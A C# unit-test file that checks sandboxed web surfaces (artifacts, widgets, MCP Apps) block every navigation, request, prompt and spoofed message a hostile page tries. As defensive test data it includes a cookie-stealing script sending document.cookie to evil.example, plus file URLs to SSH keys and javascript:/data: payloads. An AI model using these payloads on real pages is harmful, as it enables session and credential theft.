using System.Text.Json.Nodes;
using Marrow.Core.Models;
using Marrow.Core.Web;
using Marrow.Services.Web;

namespace Marrow.Services.Tests.Web;

// PORT-ONLY: web surfaces W26 security review, the sandbox-escape suite's headless part (DESIGN.md 13.4; 6.5, 7.6, 8.1-8.4;
// docs/security/web-surfaces-threat-model.md). A hostile page mounted in each sandboxed surface (an artifact, an inline
// widget, an MCP App whose declared domains the user allowed) tries every way out the fake engine models: navigating
// anywhere, top level or frame, by click or by script; new windows, protocols, downloads, every permission, sign-in,
// certificate and dialog prompts, fullscreen and screen capture; every resource kind to an undeclared host, the local
// network, a file or another sandbox's site; and messages posted under any other origin. All of them stay closed. The
// MCP App's own links wait for the user (ED-NEW-web-w26-3), its frames reach only declared frame domains
// (ED-NEW-web-w26-5) and a local-network domain needs broad access (ED-NEW-web-w26-4). The same pages on the real engine
// are SandboxEscapeNativeTests (the lead's native window).
[Trait("Decision", "ED-NEW-web-w26-8")]
public sealed class SandboxEscapeTests
{
    private const string Hostile = "<script>new RTCPeerConnection();open('https://evil.example');location='https://evil.example/?d='+document.cookie</script>";

    public static TheoryData<string> Surfaces => new() { "artifact", "widget", "app" };

    private static (WebSurfaceView View, FakeWebView Fake, string Origin, string Hello, Action Close) Open(string surface)
    {
        switch (surface)
        {
            case "artifact":
            {
                var rig = new ArtifactRuntimeRig();
                var (mount, view) = rig.Mount(rig.Create(ArtifactKind.Html, Hostile));
                return (mount.View, view, mount.Origin, "{\"nth\":1,\"s\":\"doc1\",\"id\":7,\"type\":\"theme.get\"}", rig.Dispose);
            }
            case "widget":
            {
                var web = new WebRig();
                var live = web.OpenLive(WebSurfaceKind.InlineWidget, url: null);
                var widget = new InlineWidgetMount(live, "board-1", Hostile, ArtifactRuntimeRig.Libraries);
                return (live, WebRig.Fake(live), widget.Origin, "{\"nth\":1,\"s\":\"doc1\",\"id\":7,\"type\":\"theme.get\"}", () =>
                {
                    widget.Dispose();
                    web.Dispose();
                });
            }
            default:
            {
                var rig = new McpAppsRig();
                rig.Ui.DomainAnswer = McpAppDomainDecision.Allow;
                var (mount, view) = rig.Open();
                var hello = new JsonObject
                {
                    ["jsonrpc"] = "2.0", ["id"] = "spoof", ["method"] = McpAppProtocol.Initialize,
                    ["params"] = new JsonObject { ["protocolVersion"] = McpAppProtocol.Version, ["clientInfo"] = new JsonObject { ["name"] = "x", ["version"] = "1" }, ["appCapabilities"] = new JsonObject() },
                };
                return (mount.View, view, rig.Origin, hello.ToJsonString(), rig.Dispose);
            }
        }
    }

    private static string[] OtherSites(string own) =>
    [
        ArtifactRuntime.Address(ArtifactRuntimeRig.OtherChat, "weather"),
        SandboxSites.Origin(SandboxSites.WidgetHost("other")) + "/",
        SandboxSites.Origin(SandboxSites.AppHost("other", "ui://other/x")) + "/",
        own + ":444/",
        "http://" + own["https://".Length..] + "/",
    ];

    [Theory]
    [MemberData(nameof(Surfaces))]
    public void Every_navigation_off_the_site_is_cancelled_by_click_or_script_top_level_or_frame(string surface)
    {
        var (view, fake, origin, _, close) = Open(surface);
        try
        {
            var away = new List<string>(OtherSites(origin))
            {
                "https://evil.example/?d=secret", "http://evil.example/", "file:///C:/Users/me/.ssh/id_rsa", "javascript:alert(1)",
                "data:text/html,<script>parent.postMessage(1,'*')</script>", "blob:https://evil.example/0b8d9c1e", "https://localhost:3000/",
                "http://127.0.0.1:8080/", "https://192.168.1.10/", "edge://settings/", "chrome://settings/", "ms-settings:privacy",
                "view-source:https://evil.example/", "https://api.shipyard.dev/", "https://cdn.shipyard.dev/frame.html",
            };
            foreach (var url in away)
            {
                foreach (var (user, main) in new[] { (true, true), (false, true), (true, false), (false, false) })
                    Assert.True(fake.RaiseNavigationStarting(url, userInitiated: user, mainFrame: main).Cancel, $"{surface} reached {url} (user {user}, main {main})");
            }

            Assert.False(fake.RaiseNavigationStarting(origin + "/", userInitiated: false).Cancel);
            Assert.False(fake.RaiseNavigationStarting("about:srcdoc", userInitiated: false, mainFrame: false).Cancel);
            Assert.True(view.IsSandboxed);
        }
        finally { close(); }
    }

    [Theory]
    [MemberData(nameof(Surfaces))]
    public void No_window_protocol_download_prompt_or_screen_share_gets_out_even_when_a_listener_says_yes(string surface)
    {
        var (view, fake, origin, _, close) = Open(surface);
        try
        {
            view.NewWindowRequested += (_, e) => e.Respond(WebNewWindowDecision.HandledByNth);
            view.ExternalUriRequested += (_, e) => e.Respond(true);
            view.DownloadStarting += (_, e) => e.Respond(new WebDownloadDecision(true, @"C:\Users\me\Desktop\run.exe"));
            view.AuthenticationRequested += (_, e) => e.Respond(new WebCredentials("me", "secret"));
            view.ScriptDialogOpening += (_, e) => e.Respond(new WebScriptDialogDecision(true, "typed"));
            view.CertificateErrorDetected += (_, e) => e.Respond(true);
            view.PermissionRequested += (_, e) => e.Respond(WebPermissionDecision.AllowAlways);
            var fullScreen = 0;
            view.FullScreenChanged += (_, _) => fullScreen++;

            foreach (var url in new[] { "https://evil.example/", origin + "/", "about:blank" })
                Assert.Equal(WebNewWindowDecision.Block, WebRig.Decided(fake.RaiseNewWindow(url, userInitiated: false)));
            foreach (var uri in new[] { "ms-settings:privacy", "mailto:a@evil.example", "file:///C:/Windows/System32/cmd.exe", "search-ms:query=secret" })
            {
                Assert.False(WebRig.Decided(fake.RaiseExternalUri(uri, origin, userInitiated: true)));
                Assert.False(WebRig.Decided(fake.RaiseExternalUri(uri, origin, userInitiated: false)));
            }

            Assert.Equal(WebDownloadDecision.Cancel, WebRig.Decided(fake.RaiseDownload(origin + "/run.exe", "run.exe", origin: origin)));
            Assert.Equal(WebDownloadDecision.Cancel, WebRig.Decided(fake.RaiseDownload("blob:" + origin + "/0b8d", "report.html", origin: origin)));
            foreach (var kind in Enum.GetValues<WebPermissionKind>())
                Assert.Equal(WebPermissionDecision.Deny, WebRig.Decided(fake.RaisePermission(origin, kind)));
            Assert.Null(WebRig.Decided(fake.RaiseAuth(origin + "/")));
            Assert.Null(WebRig.Decided(fake.RaiseAuth("https://evil.example/")));
            foreach (var kind in Enum.GetValues<WebScriptDialogKind>())
                Assert.Equal(WebScriptDialogDecision.Dismiss, WebRig.Decided(fake.RaiseScriptDialog(origin + "/", kind, "Enter your password")));
            Assert.False(WebRig.Decided(fake.RaiseCertificateError("https://evil.example/")));
            Assert.False(WebRig.Decided(fake.RaiseScreenCapture(origin)));

            fake.RaiseFullScreen(true);
            Assert.Equal(0, fullScreen);
            Assert.Contains("Script " + WebFeatureGuard.ExitFullscreenScript, fake.Log);
        }
        finally { close(); }
    }

    [Theory]
    [MemberData(nameof(Surfaces))]
    public void Every_resource_kind_to_an_undeclared_host_the_local_network_a_file_or_another_sandbox_is_refused(string surface)
    {
        var (_, fake, origin, _, close) = Open(surface);
        try
        {
            var away = new List<string>(OtherSites(origin))
            {
                "https://evil.example/collect?d=secret", "http://evil.example/", "wss://evil.example/socket", "ws://evil.example/socket",
                "https://localhost:3000/", "http://127.0.0.1:8080/", "https://192.168.1.10/", "https://[::1]/", "https://10.0.0.5/",
                "file:///C:/Users/me/.ssh/id_rsa", "https://api.shipyard.dev.evil.example/", "https://evil.example/?u=https://api.shipyard.dev",
                "http://api.shipyard.dev/releases", "ftp://evil.example/",
            };
            if (surface != "app") away.AddRange(["https://api.shipyard.dev/releases", "https://cdn.shipyard.dev/app.js"]);
            foreach (var url in away)
            {
                foreach (var kind in Enum.GetValues<WebResourceKind>())
                {
                    var answer = fake.Request(url, kind);
                    Assert.True(answer is { StatusCode: 403 }, $"{surface}: {kind} {url} answered {answer?.StatusCode.ToString(System.Globalization.CultureInfo.InvariantCulture) ?? "by the network"}");
                    Assert.Null(answer!.Header("Access-Control-Allow-Origin"));
                }
            }

            foreach (var method in new[] { "POST", "PUT", "DELETE" })
                Assert.NotEqual(200, fake.Request(origin + "/", WebResourceKind.Fetch, method)?.StatusCode ?? 200);
        }
        finally { close(); }
    }

    [Theory]
    [MemberData(nameof(Surfaces))]
    public void A_message_under_any_other_origin_is_never_answered(string surface)
    {
        var (_, fake, origin, hello, close) = Open(surface);
        try
        {
            int Posts() => fake.Log.Count(l => l.StartsWith("Post ", StringComparison.Ordinal));
            var before = Posts();
            var spoofed = new List<string>(OtherSites(origin).Select(site => site.TrimEnd('/')))
            {
                "https://evil.example", "null", "", origin + ".evil.example", origin.ToUpperInvariant() + ".evil.example", "about:blank", "file://",
            };
            foreach (var other in spoofed) fake.RaiseMessage(other, hello);
            Assert.Equal(before, Posts());

            fake.RaiseMessage(origin, hello); // the same message from the page's own origin is answered
            Assert.True(Posts() > before);
        }
        finally { close(); }
    }

    [Fact]
    public void Sandboxes_run_in_the_artifacts_profile_isolated_with_no_host_objects_dev_tools_or_browser_ui()
    {
        var profiles = new WebProfiles(WebRig.UserData, "en-US");
        foreach (var kind in new[] { WebSurfaceKind.Artifact, WebSurfaceKind.InlineWidget, WebSurfaceKind.McpApp })
        {
            var creation = profiles.For(kind);
            Assert.Equal(WebProfileKind.Artifacts, creation.Kind);
            Assert.True(creation.IsInPrivate);
            Assert.False(creation.EnableDevTools);
            Assert.Contains("--site-per-process", creation.AdditionalBrowserArguments ?? "", StringComparison.Ordinal);
            Assert.Contains("--force-webrtc-ip-handling-policy=disable_non_proxied_udp", creation.AdditionalBrowserArguments ?? "", StringComparison.Ordinal);
            var plan = WebView2Engine.SettingsFor(creation);
            Assert.False(plan.AreHostObjectsAllowed);
            Assert.True(plan.IsWebMessageEnabled);
            Assert.False(plan.AreDevToolsEnabled);
            Assert.False(plan.AreDefaultScriptDialogsEnabled);
            Assert.False(plan.AreDefaultContextMenusEnabled);
            Assert.False(plan.IsPasswordAutosaveEnabled);
            Assert.False(plan.IsGeneralAutofillEnabled);
            Assert.False(plan.AreBrowserAcceleratorKeysEnabled);
            Assert.True(plan.IsReputationCheckingRequired);
        }

        // Only sandboxes take web messages; every other profile has no channel to nth at all.
        foreach (var kind in new[] { WebSurfaceKind.VisusTab, WebSurfaceKind.VisusPrivateTab, WebSurfaceKind.PreviewTab })
            Assert.False(WebView2Engine.SettingsFor(profiles.For(kind)).IsWebMessageEnabled);
        Assert.False(WebView2Engine.SettingsFor(profiles.For(WebSurfaceKind.AgentTab, @"C:\threads\one")).IsWebMessageEnabled);
    }

    [Fact]
    [Trait("Decision", "ED-NEW-web-w26-3")]
    public void An_apps_own_link_waits_for_the_users_open_one_card_at_a_time()
    {
        using var rig = new McpAppsRig(csp: McpUiCsp.None);
        rig.Open();
        rig.Handshake();
        var held = new TaskCompletionSource<bool>();
        rig.Ui.HeldLink = held;

        rig.Send(new JsonObject { ["id"] = "l1", ["method"] = McpAppProtocol.OpenLink, ["params"] = new JsonObject { ["url"] = "https://tracker.example/?d=board-secrets" } });
        Assert.False(rig.Replied("l1"));
        Assert.Empty(rig.Ui.Links);
        var second = rig.Call("l2", McpAppProtocol.OpenLink, new JsonObject { ["url"] = "https://tracker.example/again" });
        Assert.NotNull(second["error"]);
        Assert.Equal(["https://tracker.example/?d=board-secrets"], rig.Ui.LinkCards);

        held.SetResult(false);
        Assert.NotNull(rig.Reply("l1")["error"]);
        Assert.Empty(rig.Ui.Links);

        rig.Ui.HeldLink = null;
        rig.Ui.LinkAnswer = true;
        Assert.NotNull(rig.Call("l3", McpAppProtocol.OpenLink, new JsonObject { ["url"] = "https://shipyard.dev/releases" })["result"]);
        Assert.Equal(["https://shipyard.dev/releases"], rig.Ui.Links);
        // A click inside the view is the user's own gesture: it goes to the link setting with no card.
        rig.View!.RaiseNavigationStarting("https://shipyard.dev/docs", userInitiated: true);
        Assert.Equal(2, rig.Ui.LinkCards.Count);
        Assert.Equal(["https://shipyard.dev/releases", "https://shipyard.dev/docs"], rig.Ui.Links);
    }

    [Fact]
    [Trait("Decision", "ED-NEW-web-w26-5")]
    public void An_apps_frames_reach_only_its_declared_frame_domains()
    {
        using var rig = new McpAppsRig(csp: new McpUiCsp(["https://api.shipyard.dev"], ["cdn.shipyard.dev"], ["https://embed.shipyard.dev"], []));
        rig.Ui.DomainAnswer = McpAppDomainDecision.Allow;
        var (_, view) = rig.Open();

        Assert.False(view.RaiseNavigationStarting("https://embed.shipyard.dev/chart", userInitiated: false, mainFrame: false).Cancel);
        Assert.True(view.RaiseNavigationStarting("https://api.shipyard.dev/upload?d=secret", userInitiated: false, mainFrame: false).Cancel);
        Assert.True(view.RaiseNavigationStarting("https://cdn.shipyard.dev/page.html", userInitiated: false, mainFrame: false).Cancel);
        Assert.True(view.RaiseNavigationStarting("https://embed.shipyard.dev/chart", userInitiated: false, mainFrame: true).Cancel);
        Assert.True(view.RaiseNavigationStarting("http://embed.shipyard.dev/chart", userInitiated: false, mainFrame: false).Cancel);
    }

    [Fact]
    [Trait("Decision", "ED-NEW-web-w26-4")]
    public void An_apps_local_network_domains_need_broad_access()
    {
        var local = new McpUiCsp(["https://api.shipyard.dev", "https://192.168.1.10", "https://localhost:8443", "https://printer.local"], [], [], []);
        using var plain = new McpAppsRig(csp: local);
        plain.Ui.DomainAnswer = McpAppDomainDecision.Allow;
        var (_, view) = plain.Open();

        var card = Assert.Single(plain.Ui.DomainCards);
        Assert.Equal(["api.shipyard.dev"], card.Domains);
        Assert.True(card.HasBroad);
        Assert.Equal(3, card.Broad.Count(b => b.Reason == CspBuilder.LocalNetworkReason));
        Assert.Null(view.Request("https://api.shipyard.dev/releases", WebResourceKind.Fetch));
        foreach (var url in new[] { "https://192.168.1.10/admin", "https://localhost:8443/", "https://printer.local/" })
            Assert.Equal(403, view.Request(url, WebResourceKind.Fetch)!.StatusCode);
        Assert.Equal(["https://api.shipyard.dev"], CspBuilder.Parse(HeaderOf(view, plain.Origin))["connect-src"]);

        using var broad = new McpAppsRig(csp: local);
        broad.Ui.DomainAnswer = McpAppDomainDecision.AllowBroad;
        var (_, wide) = broad.Open();
        Assert.Null(wide.Request("https://192.168.1.10/admin", WebResourceKind.Fetch));
    }

    private static string HeaderOf(FakeWebView view, string origin) =>
        view.Request(origin + "/", WebResourceKind.Document)!.Header("Content-Security-Policy") ?? "";
}
